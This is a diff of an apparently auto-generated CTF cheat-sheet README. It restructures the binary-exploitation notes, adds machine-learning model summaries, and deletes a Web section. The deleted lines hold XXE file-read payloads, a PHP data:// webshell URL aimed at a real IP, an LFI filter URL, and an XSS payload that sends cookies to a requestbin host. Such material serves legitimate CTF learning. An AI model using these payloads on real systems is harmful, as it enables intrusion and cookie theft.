@@ -20,7 +20,6 @@ This file is auto generated using [build.py](build.py). To update it, update the
 * [Reverse Engineering](#reverse-engineering)
 * [Forensics](#forensics)
 * [Cryptography](#cryptography)
-* [Web](#web)
 * [Steganography](#steganography)
 * [PDF Files](#pdf-files)
 * [ZIP Files](#zip-files)
@@ -351,37 +350,50 @@ $ find / -perm -u=s -type f 2>/dev/null
 
 # Binary Exploitation
 
-
-
-## ELF
-
 Different types of exploit exists, the most common are:
 
 | Name | Description |
 | ---- | ----------- |
-| [Format String](Binary%20Exploitation/Tools/ELF/6-format_string_vulns/) | Exploits format string functions to read and write in the program memory |
-| [Overwriting stack variables](Binary%20Exploitation/Tools/ELF/1-overwriting_stack_variables/) | Change the value of a variable on the stack. |
-| [ret2win](Binary%20Exploitation/Tools/ELF/3-ret2win_with_params/) | Overwrite the return address to point to an interesting function of the program |
-| [Shellcode](Binary%20Exploitation/Tools/ELF/4-injecting_custom_shellcode/) | Inject shellcode in the program memory and execute it |
-| [ret2libc](Binary%20Exploitation/Tools/ELF/5-return_to_libc/) | Overwrite the return address to point to an intersting function in libc |
-| [Overwriting GOT](Binary%20Exploitation/Tools/ELF/8-overwriting_got/) | Overwrite the address of a function in the GOT to point to an interesting function |
+| [Format String](/Tools/ELF/6-format_string_vulns/) | Exploits format string functions to read and write in the program memory |
+| [Overwriting stack variables](/Tools/ELF/1-overwriting_stack_variables/) | Change the value of a variable on the stack. |
+| [ret2win](/Tools/ELF/3-ret2win_with_params/) | Overwrite the return address to point to an interesting function of the program |
+| [Shellcode](/Tools/ELF/4-injecting_custom_shellcode/) | Inject shellcode in the program memory and execute it |
+| [ret2libc](/Tools/ELF/5-return_to_libc/) | Overwrite the return address to point to an intersting function in libc |
+| [Overwriting GOT](/Tools/ELF/8-overwriting_got/) | Overwrite the address of a function in the GOT to point to an interesting function |
 
 But some security mechanisms exists and can be bypassed:
 
-- ASLR
-Randomization of the memory addresses of the program and the libraries.
-Solution: Leak an adress and calculate the offset between the leaked address and the address of the function you want to call.
+- ASLR<br>
+    Randomization of the memory addresses of the program and the libraries.
+    Solution: Leak an adress and calculate the offset between the leaked address and the address of the function you want to call.
 
-- NX
-No execution of the stack.
+- NX<br>
+    No execution of the stack.
 
-- Stack canaries
-A random value is stored on the stack and checked before returning from a function.
-Solution: [Leak the canary](Binary%20Exploitation/Tools/ELF/9-bypassing_canaries/) and overwrite it with the correct value.
+- Stack canaries<br>
+    A random value is stored on the stack and checked before returning from a function.
+    Solution: [Leak the canary](/Tools/ELF/9-bypassing_canaries/) and overwrite it with the correct value.
 
-- PIE
-Randomization of the memory addresses of the program.
-Solution: [Leak an adress](Binary%20Exploitation/Tools/ELF/7-leak_pie_ret2libc/)
+- PIE<br>
+    Randomization of the memory addresses of the program.
+    Solution: [Leak an adress](/Tools/ELF/7-leak_pie_ret2libc/)
+
+Tools that will help you to exploit a binary:
+
+* [gdb](https://en.wikipedia.org/wiki/GNU_Debugger)
+
+    Most popular debugger for **dynamic** analysis.
+    See [Reverse Engineering](#reverse%20engineering) for more info.
+
+* [Ghidra](https://ghidra-sre.org/)
+
+	Decompiler for binary files, usefull for **static** analysis.
+	See [Reverse Engineering](#reverse%20engineering) for more info.
+
+
+
+## ELF
+
 
 * [`checksec`](https://docs.pwntools.com/en/stable/commandline.html)
 
@@ -428,11 +440,6 @@ Start a gdb server inside wine: (found at https://stackoverflow.com/questions/39
 $ wine Z:/usr/share/win64/gdbserver.exe localhost:12345 myprogram.exe
 $ x86_64-w64-mingw32-gdb myprogram.exe
 ```
-
-* [Ghidra](https://ghidra-sre.org/)
-
-	Decompiler for binary files, usefull for static analysis.
-	See [Reverse Engineering](#reverse%20engineering) for more info.
 
 * [`Immunity Debugger`](https://www.immunityinc.com/products/debugger/)
 
@@ -498,7 +505,7 @@ bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
 
 	Decompiler for binary files, usefull for static analysis.
 
-Automaticaly create a ghidra project from a binary file:
+Automaticaly create a ghidra project from a binary file using [this script](Reverse%20Engineering/Tools/ghidra.py):
 ```bash
 ghidra.py <file>
 ```
@@ -1095,272 +1102,6 @@ Base91:
 	The "blind SQL" of cryptography... leak the flag out by testing for characters just one byte away from the block length.
 <br><br>
 
-# Web
-
-
-* [CloudFlare Bypass](https://github.com/Anorov/cloudflare-scrape)
-
-	If you need to script or automate against a page that uses the I'm Under Attack Mode from CloudFlare, or DDOS protection, you can do it like this with linked Python module.
-
-``` python
-#!/usr/bin/env python
-
-import cfscrape
-
-url = 'http://yashit.tech/tryharder/'
-
-scraper = cfscrape.create_scraper()
-print scraper.get(url).content
-```
-
-* [`wpscan`](https://wpscan.org/)
-
-	* A Ruby script to scan and do reconnaissance on a [Wordpress](https://en.wikipedia.org/wiki/WordPress) application.
-
-* Mac AutoLogin Password Cracking
-
-Sometimes, given an Mac autologin password file `/etc/kcpassword`, you can crack it with this code:
-
-```
-def kcpasswd(ciphertext):
-    key = '7d895223d2bcddeaa3b91f'
-    while len(key) < (len(ciphertext)*2):
-        key = key + key
-    key = binasciiunhexlify(key)
-    result = ''
-    for i in range(len(ciphertext)):
-        result += chr(ord(ciphertext[i]) ^ (key[i]))
-    return result
-```
-* XXE : XML External Entity
-
-An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.
-We try to display the content of the file /flag :
-
-```
-<?xml version="1.0"?>
-<!DOCTYPE data [
-<!ELEMENT data (#ANY)>
-<!ENTITY file SYSTEM "file:///flag">
-]>
-<data>&file;</data>
-
-<?xml version="1.0" encoding="UTF-16"?>
-  <!DOCTYPE foo [
-  <!ELEMENT foo ANY >
-  <!ENTITY xxe SYSTEM "file:///flag" >]><foo>&xxe;</foo>
-
-  ```
-* Wordpress Password Hash Generator
-
-	If you make it into a Wordpress database and can change passwords, reset the admin password to a new hash: [http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4](http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4). This will let you login to /wp-admin/ on the site.
-
-
-
-
-* Flask Template Injection
-
-	Try `{{config}}` to leak out the secret key, or start to climb up the Python MRO to acheive code execution.
-
-	[https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html](https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html), [https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html](https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html), [https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html](https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html)
-
-
-
-* [`nikto`](https://github.com/sullo/nikto)
-
-	A Perl script to scan and do reconnaissance on a web application.
-
-
-* [Burpsuite](https://portswigger.net/burp)
-
-	A proxy server that allows you to intercept and modify HTTP requests and responses. It's a great tool for testing web applications.
-
-
-
-
-* AWS / S3 Buckets
-
-	You can try and dump an AWS bucket like so. The `--no-sign-request` avoids the need for credentials, and `--recursive` will grab everything possible.
-
-```
-aws s3 cp --recursive --no-sign-request s3://<bucket_name> .
-```
-	i. e. `aws s3 cp --recursive --no-sign-request s3://tamuctf .`
-
-
-## SQL Injection
-
-* [`sqlmap`](https://github.com/sqlmapproject/sqlmap)
-
-	A command-line tool written in [Python](https://www.python.org/) to automatically detect and exploit vulnerable SQL injection points.
-
-* SQL `IF` statements
-
-	These are handy for some injections and setting up some Blind SQL if you need to. Syntax is like `SELECT ( IF ( 1=1, "Condition successful!", "Condition errored!" ) )`
-
-* Explicit SQL Injection
-
-
-
-* Blind SQL Injection
-
-
-## Enumeration
-
-
-
-* `robots.txt`
-
-	File to tell search engines not to index certain files or directories.
-
-
-* Mac / Macintosh / Apple Hidden Files `.DS_Store` [DS_Store_crawler](https://github.com/anantshri/DS_Store_crawler_parser)
-
-	On Mac computers, there is a hidden index file `.DS_Store`. Useful if you have a **LFI** vulnerability.
-
-```bash
-python3 dsstore_crawler.py -i <url>
-```
-
-* Bazaar `.bzr` directory
-
-	Contains the history of the project. Can be used to find old versions of the project. Can be fetched with [https://github.com/kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)
-
-Download the bzr repository:
-```bash
-bzr branch <url> <out-dir>
-```
-
-* `/.git/`
-
-	Sign of an exposed git repository. Contains the history of the project. Can be used to find old versions of the project and to maybe find credentials in sources.
-
-* [`GitDumper`](https://github.com/arthaud/git-dumper)
-
-	A command-line tool that will automatically scrape and download a [git](https://git-scm.com/) repository hosted online with a given URL.
-
-```bash
-gitdumper <url>/.git/ <out-dir>
-```
-
-
-
-## NoSQL Injection
-
-
-
-## PHP
-
-
-* Magic Hashes
-
-	A common vulnerability in [PHP](https://en.wikipedia.org/wiki/PHP) that fakes hash "collisions..." where the `==` operator falls short in [PHP](https://en.wikipedia.org/wiki/PHP) type comparison, thinking everything that follows `0e` is considered scientific notation (and therefore 0). More valuable info can be found here: [https://github.com/spaze/hashes](https://github.com/spaze/hashes), but below are the most common breaks.
-
-| Plaintext | MD5 Hash |
-| --------- | -------- |
-|240610708|0e462097431906509019562988736854|
-|QLTHNDT|0e405967825401955372549139051580|
-|QNKCDZO|0e830400451993494058024219903391|
-|PJNPDWY|0e291529052894702774557631701704|
-|NWWKITQ|0e763082070976038347657360817689|
-|NOOPCJF|0e818888003657176127862245791911|
-|MMHUWUV|0e701732711630150438129209816536|
-|MAUXXQC|0e478478466848439040434801845361|
-|IHKFRNS|0e256160682445802696926137988570|
-|GZECLQZ|0e537612333747236407713628225676|
-|GGHMVOE|0e362766013028313274586933780773|
-|GEGHBXL|0e248776895502908863709684713578|
-|EEIZDOI|0e782601363539291779881938479162|
-|DYAXWCA|0e424759758842488633464374063001|
-|DQWRASX|0e742373665639232907775599582643|
-|BRTKUJZ|00e57640477961333848717747276704|
-|ABJIHVY|0e755264355178451322893275696586|
-|aaaXXAYW|0e540853622400160407992788832284|
-|aabg7XSs|0e087386482136013740957780965295|
-|aabC9RqS|0e041022518165728065344349536299|
-|0e215962017|0e291242476940776845150308577824|
-
-| Plaintext | SHA1 Hash |
-| --------- | --------- |
-|aaroZmOk|0e66507019969427134894567494305185566735|
-|aaK1STfY|0e76658526655756207688271159624026011393|
-|aaO8zKZF|0e89257456677279068558073954252716165668|
-|aa3OFF9m|0e36977786278517984959260394024281014729|
-
-| Plaintext | MD4 Hash |
-| --------- | --------- |
-|bhhkktQZ|0e949030067204812898914975918567|
-|0e001233333333333334557778889|0e434041524824285414215559233446|
-|0e00000111222333333666788888889|0e641853458593358523155449768529|
-|0001235666666688888888888|0e832225036643258141969031181899|
-
-
-* `preg_replace`
-
-	A bug in older versions of [PHP](https://en.wikipedia.org/wiki/PHP) where the user could get remote code execution
-
-	[http://php.net/manual/en/function.preg-replace.php](http://php.net/manual/en/function.preg-replace.php)
-
-
-* [`phpdc.phpr`](https://github.com/lighttpd/xcache/blob/master/bin/phpdc.phpr)
-
-	A command-line tool to decode [`bcompiler`](http://php.net/manual/en/book.bcompiler.php) compiled [PHP](https://en.wikipedia.org/wiki/PHP) code.
-
-
-* [`php://filter` for Local File Inclusion](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/)
-
-	A bug in [PHP](https://en.wikipedia.org/wiki/PHP) where if GET HTTP variables in the URL are controlling the navigation of the web page, perhaps the source code is `include`-ing other files to be served to the user. This can be manipulated by using [PHP filters](http://php.net/manual/en/filters.php) to potentially retrieve source code. Example like so:
-
-```
-http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
-```
-
-
-* `data://text/plain;base64`
-
-	A [PHP](https://en.wikipedia.org/wiki/PHP) stream that can be taken advantage of if used and evaluated as an `include` resource or evaluated. Can be used for RCE: check out this writeup: [https://ctftime.org/writeup/8868](https://ctftime.org/writeup/8868) ... TL;DR:
-
-```
-http://103.5.112.91:1234/?cmd=whoami&page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=
-```
-
-
-* [`PHP Generic Gadget Chains`](https://github.com/ambionics/phpggc)
-
-	Payloads for Object injection in `unserialize` on different frameworks.
-
-## XSS
-
-The **XSS** vulnerability occurs when a user can control the content of a web page. A malicious code can be used to steal cookies of authentified users, redirect the user to a malicious site, or even execute arbitrary code on the user's machine.
-
-* [XSS]/[Cross-site scripting]
-
-	[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet). [Cross-site scripting], vulnerability where the user can control rendered [HTML](https://en.wikipedia.org/wiki/HTML) and ideally inject [JavaScript](https://en.wikipedia.org/wiki/JavaScript) code that could drive a browser to any other website or make any malicious network calls. Example test payload is as follows:
-
-
-```
-<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
-```
-
-	Typically you use this to steal cookies or other information, and you can do this with an online requestbin.
-
-```
-<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
-```
-* new usefull XSS cheat sheet : 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet'
-
-* [XSStrike](https://github.com/UltimateHackers/XSStrike) 
-	A command-line tool for automated [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) attacks. Seems to function like how [sqlmap](https://github.com/sqlmapproject/sqlmap) does.
-
-* [`requestb.in`](https://requestb.in/)
-
-	A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) vulnerabilty.
-
-* [`hookbin.com`](https://hookbin.com/)
-
-	A free tool and online end-point that can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) vulnerabilty.
-<br><br>
-
 # Steganography
 
 WHEN GIVEN A FILE TO WORK WITH, DO NOT FORGET TO RUN THIS STEGHIDE WITH AN EMPTY PASSWORD!
@@ -1780,6 +1521,8 @@ Whisper my world
 
 # Data Science
 
+
+
 * [SciKit Lean](https://scikit-learn.org/)
 
     Machine learning in Python.
@@ -1788,17 +1531,62 @@ Whisper my world
 
     Data mining in Python.
 
-## Unsupervised clasification
+* [(Book) Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow, Aurélien Géron]()
+
+    Very useful book that was used to create this section.
+
+## Unsupervised Clasification
+
+### Models
+
+* [K-Means Clustering]()
+
+    Simple clustering algorithm that groups data points into a specified number of clusters.
+
+* [Gaussian Mixture Model (GMM)]()
+
+    A probabilistic model that assumes that the data was generated from a finite sum of Gaussian distributions.
 
 
 
-## Image classification
+
+## Supervised Classification
+
+#### Models
+
+* [Logistic Regression]()
+
+    High explainablility, reasonable computation cost.
+
+* [Decision Tree]()
+
+    Performs classification, regression, and multi-output tasks. Good at finding **orthogonal** decision boundaries.
+
+    But very sensitive to small changes in the data, which make them hard to train.
 
 
+* [Random Forest]()
 
-## Feature prediction
+    Very powerful model. Uses an ensemble method to combine multiple decision trees. 
 
 
+* [Support Vector Machine (SVM)]()
+
+    Popular model that performs linear and non-linear classification, regression, and outlier detection.
+
+    Works well with **small to medium** sized datasets.
+
+
+* [K-Nearest Neighbors (KNN)]()
+
+
+* [Naive Bayes]()
+
+* [Multi Layer Perceptron (MLP)]()
+
+    A neural network model that can learn non-linear decision boundaries.
+
+    Good for **large** datasets.
 <br><br>
 
 # Signal processing
